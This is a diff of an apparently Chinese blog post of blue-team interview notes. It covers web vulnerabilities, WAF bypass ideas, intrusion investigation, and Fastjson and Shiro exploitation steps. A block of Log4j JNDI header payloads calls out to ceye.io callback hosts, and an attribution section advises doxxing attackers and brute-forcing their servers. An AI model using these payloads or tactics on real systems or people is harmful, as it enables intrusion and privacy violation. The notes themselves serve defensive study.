 <h3 id="updataxml报错原理"><a href="#updataxml报错原理" class="headerlink" title="updataxml报错原理"></a>updataxml报错原理</h3><p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML的内容<br>第二个参数：是需要update的位置XPATH路径<br>第三个参数：是更新后的内容</p>
 <p>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p>
 <h3 id="sql注入常见的函数"><a href="#sql注入常见的函数" class="headerlink" title="sql注入常见的函数"></a>sql注入常见的函数</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45744814/article/details/120436723">(83条消息) sql注入常见函数（附图详解）_君莫hacker的博客-CSDN博客_sql注入函数</a></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606160636312.png" alt="image-20220606160636312"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606160636312.png" alt="image-20220606160636312"></p>
 <h2 id="xss："><a href="#xss：" class="headerlink" title="xss："></a>xss：</h2><p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br>形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
 <p>反射型 存储型 dom型</p>
 <p>DOM型xss给予文档对象模型的一种漏洞。DOM是一个与平,编程语言无关的接口,它允许程序或脚本动态访问和更新文档内容,结构和样式,处理后的结果能够成为显示页面的一部分。</p>
@@ -390,12 +390,12 @@
 <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。<br>绕过思路<br>图片马  mime  %00 0x00  扩展名  .htccess文件绕过   解析漏洞  条件竞争</p>
 <p>绕waf</p>
 <p>字符变异（大小写，多个分号），顺序颠倒（交换name和filename的值），数据重复（filename重复），数据你出（name与filename之间插入垃圾数据，bundary字符串中加入垃圾数据），数据截断（00截断，引号截断）</p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172901546.png" alt="image-20220616172901546"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616161354087.png" alt="image-20220616161354087"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172901546.png" alt="image-20220616172901546"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616161354087.png" alt="image-20220616161354087"></p>
 <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p>
 <p>include() require()</p>
 <h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>system、eval和exec等函数，是该漏洞攻击成功的主要原因。</p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172913149.png" alt="image-20220616172913149"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616172913149.png" alt="image-20220616172913149"></p>
 <h2 id="反序列化漏洞（一会补充"><a href="#反序列化漏洞（一会补充" class="headerlink" title="反序列化漏洞（一会补充"></a>反序列化漏洞（一会补充</h2><p>一、serialize()<br>二、unserialize()</p>
 <h2 id="ssrf以及常见的利用协议"><a href="#ssrf以及常见的利用协议" class="headerlink" title="ssrf以及常见的利用协议"></a>ssrf以及常见的利用协议</h2><p>常见协议</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file http dict  gopher   常见利用就是ssrf加上redis未授权</span><br></pre></td></tr></table></figure>
@@ -432,7 +432,7 @@
 
 
 <p>小技巧</p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606180504575.png" alt="image-20220606180504575"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606180504575.png" alt="image-20220606180504575"></p>
 <h3 id="权限维持排查"><a href="#权限维持排查" class="headerlink" title="权限维持排查"></a>权限维持排查</h3><h4 id="2-1检查服务器是否有异常的启动项"><a href="#2-1检查服务器是否有异常的启动项" class="headerlink" title="2.1检查服务器是否有异常的启动项"></a>2.1检查服务器是否有异常的启动项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a：登录服务器</span><br><span class="line">系统启动文件夹c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line">资源管理器打开“系统启动文件夹”的命令，shell:Common Startup</span><br><span class="line">用户启动文件夹：c:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">资源管理器打开“用户启动文件夹”的命令，shell:startup</span><br><span class="line"></span><br><span class="line">b:点击开始菜单》【运行】，输入msconfig,查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</span><br><span class="line"></span><br><span class="line">c:单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常</span><br><span class="line">三个注册表项：</span><br><span class="line">• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">d:利用安全软件查看启动项，开机时间管理</span><br></pre></td></tr></table></figure>
 
 <h4 id="2-2检查计划任务"><a href="#2-2检查计划任务" class="headerlink" title="2.2检查计划任务"></a>2.2检查计划任务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:单机【开始】》设置》控制面板》任务计划》查看计划任务属性，便可以发现木马文件的路径</span><br><span class="line">b:cmd》输入at命令，检查计算机与网络上的其他计算机之间的绘画或计划任务，如有，则确认是否为正常连接。（或者 schtasks.exe</span><br></pre></td></tr></table></figure>
@@ -475,8 +475,8 @@
 
 <h4 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• D盾_Web查杀：http://www.d99net.net/index.asp</span><br><span class="line">• 河马 WebShell 查杀：http://www.shellpub.co</span><br></pre></td></tr></table></figure>
 
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h3><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204100713.png" alt="image-20220615204100713"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616003137358.png" alt="image-20220616003137358"></p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h3><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204100713.png" alt="image-20220615204100713"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616003137358.png" alt="image-20220616003137358"></p>
 <h4 id="1-1账号安全"><a href="#1-1账号安全" class="headerlink" title="1.1账号安全"></a>1.1账号安全</h4><p>基本使用：</p>
 <p>1.用户信息文件/etc/passwd</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">• root:x:0:0:root:/root:/bin/bash</span><br><span class="line">• account:password:UID:GID:GECOS:directory:shell • 用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell • 注意：无密码只允许本机登陆，远程不允许登陆</span><br></pre></td></tr></table></figure>
@@ -505,7 +505,7 @@
 <h4 id="1-4检查异常进程"><a href="#1-4检查异常进程" class="headerlink" title="1.4检查异常进程"></a>1.4检查异常进程</h4><p>使用ps命令，分析进程</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux|grep pid</span><br><span class="line">ps -ef|grep pname</span><br></pre></td></tr></table></figure>
 
-<h4 id="1-5检查开机启动项"><a href="#1-5检查开机启动项" class="headerlink" title="1.5检查开机启动项"></a>1.5检查开机启动项</h4><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606215950542.png" alt="image-20220606215950542"></p>
+<h4 id="1-5检查开机启动项"><a href="#1-5检查开机启动项" class="headerlink" title="1.5检查开机启动项"></a>1.5检查开机启动项</h4><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220606215950542.png" alt="image-20220606215950542"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">• 查看运行级别命令</span><br><span class="line">• runlevel</span><br><span class="line">• 系统默认允许级别</span><br><span class="line">• vi /etc/inittab</span><br><span class="line">• id=3：initdefault #系统开机后直接进入哪个运行级别</span><br><span class="line">• 开机启动配置文件</span><br><span class="line">• /etc/rc.local</span><br><span class="line">• /etc/rc.d/rc[0~6].d</span><br><span class="line">• 说明：当我们需要开机启动自己的脚本时，只需要将可执行脚本</span><br><span class="line">丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接</span><br><span class="line">即可。</span><br></pre></td></tr></table></figure>
 
 <h4 id="1-6检查定时任务"><a href="#1-6检查定时任务" class="headerlink" title="1.6检查定时任务"></a>1.6检查定时任务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">• 1、利用 crontab 创建计划任务</span><br><span class="line">• 基本命令</span><br><span class="line">• crontab -l 列出某个用户cron服务的详细内容</span><br><span class="line">• Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如:</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">• crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">• crontab -e 使用编辑器编辑当前的crontab文件</span><br><span class="line">• 如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure>
@@ -524,7 +524,7 @@
 
 <p>删除日志：rm log.log</p>
 <h4 id="1-10-dns设置"><a href="#1-10-dns设置" class="headerlink" title="1.10 dns设置"></a>1.10 dns设置</h4><p>vim /etc/named.conf 打开配置文件</p>
-<h4 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h4><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204521867.png" alt="image-20220615204521867"></p>
+<h4 id="一些常用命令"><a href="#一些常用命令" class="headerlink" title="一些常用命令"></a>一些常用命令</h4><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204521867.png" alt="image-20220615204521867"></p>
 <h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">• 2.1 Rootkit查杀</span><br><span class="line">• Chkrootkit</span><br><span class="line">• 网址：http://www.chkrootkit.org</span><br><span class="line">• Rkhunter</span><br><span class="line">• 网址：http://rkhunter.sourceforge.net</span><br><span class="line">• 2.2 病毒查杀</span><br><span class="line">• Clamav</span><br><span class="line">• 网址：http://www.clamav.net/download.html</span><br><span class="line">• 2.3 webshell查杀</span><br><span class="line">• Linux 版：河马 WebShell 查杀：http://www.shllpub.com</span><br></pre></td></tr></table></figure>
 
 
@@ -534,13 +534,13 @@
 <p>天眼流量哪里来？核心交换机做的端口镜像</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">好像是sxf的态势感知吧</span><br><span class="line">首先你去了有很大可能接触态势感知，这是一个综合研判分析平台，由探针STA来进行流量接入，态势负责分析、阻断攻击，你经常涉及的模块功能有两个，一个是日志检索，一个是重保中心的实时监控</span><br><span class="line"></span><br><span class="line">需要客户给你接入内网或vpn，给你平台地址，浏览器直接接入访问，输入账密登录；登录后，我们找到 &gt;&gt;分析中心-日志检索这里</span><br><span class="line"></span><br><span class="line"> 然后在日志检索这块，可以做一些规则的匹配，筛选，比如只看中高危攻击，还可以根据攻击类型进行日志筛选，这块是对接的第三方设备传入的日志流量，有可能识别的厂商安全设备，比如WAF，这个你不需要管，能看到日志就行，接下来，这个就是我们要看的内容。</span><br><span class="line"> </span><br><span class="line"> 然后是安恒的防火墙</span><br><span class="line"> 在这里顺便带大家学习下如何分析，首先你看时间，如果一分钟内产生多条日志告警，那ok，把IP复制出来，去防火墙进行封禁，防火墙怎么封？啊，这，就是找到安全防护，点击添加黑名单--输入攻击IP--点击确定提交</span><br><span class="line"> 外国的ip直接封</span><br><span class="line"> 看具体的日志内容，比如网站扫描，就看它的数据包，user-agent</span><br><span class="line"> 最后写个表记录</span><br></pre></td></tr></table></figure>
 
-<h1 id="溯源-基本思路"><a href="#溯源-基本思路" class="headerlink" title="溯源(基本思路)"></a>溯源(基本思路)</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220607005009412.png" alt="image-20220607005009412"></p>
+<h1 id="溯源-基本思路"><a href="#溯源-基本思路" class="headerlink" title="溯源(基本思路)"></a>溯源(基本思路)</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220607005009412.png" alt="image-20220607005009412"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">通过黑客ID进行信息收集：</span><br><span class="line">(1) 百度信息收集：“id” （双引号为英文）</span><br><span class="line">(2) 谷歌信息收集</span><br><span class="line">(3) src信息收集（各大src排行榜）</span><br><span class="line">(4) 微博搜索（如果发现有微博记录，可使用tg查询weibo泄露数据）</span><br><span class="line">(5) 微信ID收集：微信进行ID搜索</span><br><span class="line">(6) 如果获得手机号（可直接搜索支付宝、社交账户等）</span><br><span class="line">注意：获取手机号如果自己查到的信息不多，直接上报工作群（利用共享渠道对其进行二次社工）</span><br><span class="line">(7) 豆瓣/贴吧/知乎/脉脉 你能知道的所有社交平台，进行信息收集</span><br><span class="line">(8) CSDN ID，利用CSDN老用户的一个漏洞，爆破ID手机号</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">溯源整个流程我认为有三个部分。 </span><br><span class="line">1. 攻击源捕获。 2. 溯源信息 3. 输出攻击者画像 ···攻击源的捕获是为了获得攻击者的ip、黑客id、手机号、邮箱等信息。 ···溯源信息是为了定位黑客到具体的人。 ···输出攻击者画像是为了给这个人一个格式化的档案方便下次查找与信息存储。</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615202911911.png" alt="image-20220615202911911"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615203001610.png" alt="image-20220615203001610"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615202911911.png" alt="image-20220615202911911"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615203001610.png" alt="image-20220615203001610"></p>
 <h2 id="小思路"><a href="#小思路" class="headerlink" title="小思路"></a>小思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。</span><br><span class="line"></span><br><span class="line">2.反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</span><br></pre></td></tr></table></figure>
 
 <h2 id="流量溯源"><a href="#流量溯源" class="headerlink" title="流量溯源"></a>流量溯源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门该补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</span><br></pre></td></tr></table></figure>
@@ -562,7 +562,7 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220611162251120.png" alt="image-20220611162251120"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220611162251120.png" alt="image-20220611162251120"></p>
 <h1 id="fastjson-content-type"><a href="#fastjson-content-type" class="headerlink" title="fastjson(content type)"></a>fastjson(content type)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">autotype再处理json的时候，没有对@type进行安全验证，就可以传入危险的类，远程连接rmi主机，反弹shell之类的操作。</span><br><span class="line"></span><br><span class="line">面试官：它有什么指纹特征吗？</span><br><span class="line">@type,然后大部分版本???payload还有autocommit:ture</span><br><span class="line"></span><br><span class="line">复现步骤</span><br><span class="line">（1）开启环境</span><br><span class="line">黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</span><br><span class="line">主机A引发反序列化漏洞，进行ldap远程方法调用，去连接主机B的9999端口。</span><br><span class="line">主机B的LDAP服务指定加载主机C的恶意java类，所以主机A通过主机B的LDAP服务最终加载并执行主机C的恶意java类。</span><br><span class="line">主机A执行恶意Java类，主机B获得反弹shell，控制主机A。</span><br><span class="line">进入docker容器进行复现</span><br><span class="line"></span><br><span class="line">开启抓包确定是不是fastjson框架，通过修改请求包判断是否是fastjson框架  ，应为fastjson有一个严格的格式才能解析，否则会报错</span><br><span class="line">准备一个恶意的类</span><br><span class="line">使用javac编译 rmi.java文件  生成一个类文件      </span><br><span class="line">然后将类文件放到监听的服务器上</span><br><span class="line">使用工具运行rmi文件</span><br><span class="line">修改数据包中的post请求主体</span><br><span class="line">然后进行端口监听</span><br><span class="line">点击go,发现反弹shell成功</span><br></pre></td></tr></table></figure>
 
 <h1 id="最近的spring-rce"><a href="#最近的spring-rce" class="headerlink" title="最近的spring rce"></a>最近的spring rce</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个CVE-2010-1622漏洞的原因是Spring参数绑定时，可以注入一个Java pojo对象，这个对象可以是恶意的去注册一些敏感tomcat的属性，最后通过修改Tomcat的配置来执行危险操作。</span><br><span class="line">class.*</span><br></pre></td></tr></table></figure>
@@ -633,23 +633,23 @@
 <h1 id="shiro反序列化-cookie"><a href="#shiro反序列化-cookie" class="headerlink" title="shiro反序列化(cookie)"></a>shiro反序列化(cookie)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞</span><br><span class="line"></span><br><span class="line">1.2.4 key是写在源码里的，找到key就能构造攻击链，1.2.4之后的775key是随机生成的，但我们还可以构造cookie，尝试构造攻击链。</span><br><span class="line">Shiro流量特征:数据包含有多个$$$符号，C参数含有base64编码。</span><br><span class="line"></span><br><span class="line">（1）开启环境，抓包判断是否是shiro框架</span><br><span class="line">在cookie后边加上rememberMe=1，如果回复包出现rememberMe=deleteMe，说明他就是shiro框架</span><br><span class="line">(2)获取key值，因为key值在源码中，所以需要使用工具获取</span><br><span class="line"> （3）爆破利用链</span><br><span class="line"> （4）执行反序列化漏洞命令执行</span><br><span class="line"> </span><br><span class="line"> 出网协议：rmi，jndi，ldap，jrm，jmx，jms</span><br><span class="line"> </span><br><span class="line"> Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</span><br></pre></td></tr></table></figure>
 
 <h1 id="如何判断攻击成功"><a href="#如何判断攻击成功" class="headerlink" title="如何判断攻击成功"></a>如何判断攻击成功</h1><p>看请求包和响应包</p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144014925.png" alt="image-20220613144014925"></p>
-<h1 id="扫描器流量特征"><a href="#扫描器流量特征" class="headerlink" title="扫描器流量特征"></a>扫描器流量特征</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144342246.png" alt="image-20220613144342246"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144346894.png" alt="image-20220613144346894"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144353800.png" alt="image-20220613144353800"></p>
-<h1 id="Redis未授权-6379"><a href="#Redis未授权-6379" class="headerlink" title="Redis未授权  6379"></a>Redis未授权  6379</h1><p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002422083.png" alt="image-20220616002422083"></p>
-<p><img src="/wan1/wan1/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615195653696.png" alt="image-20220615195653696"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144014925.png" alt="image-20220613144014925"></p>
+<h1 id="扫描器流量特征"><a href="#扫描器流量特征" class="headerlink" title="扫描器流量特征"></a>扫描器流量特征</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144342246.png" alt="image-20220613144342246"></p>
